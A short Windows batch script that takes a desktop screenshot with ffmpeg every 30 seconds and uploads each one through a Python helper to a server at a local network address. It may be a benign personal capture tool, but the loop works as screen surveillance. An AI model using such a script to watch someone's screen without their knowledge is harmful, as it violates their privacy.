@echo off

:loop
rem Get the current time with colons replaced by dashes
set "NOW=%TIME:~0,2%-%TIME:~3,2%-%TIME:~6,2%"
set "NOW=%NOW::=-%"

rem Capture a screenshot and save it to the current folder with the current time in the filename
set SAVE_TO_FILE=screenshot_%NOW%.png
ffmpeg -f gdigrab -framerate 1 -i desktop -frames:v 1 -loglevel quiet "%SAVE_TO_FILE%"

:check_file
rem Check if the file is still in use
for /f "usebackq" %%A in (`openfiles ^| find /i "%SAVE_TO_FILE%"`) do (
    timeout /t 1 /nobreak
    goto check_file
)

python upload.py "http://192.168.0.21:5000/upload" "%SAVE_TO_FILE%"

rem Wait for 30 seconds
timeout /t 30 /nobreak

goto loop
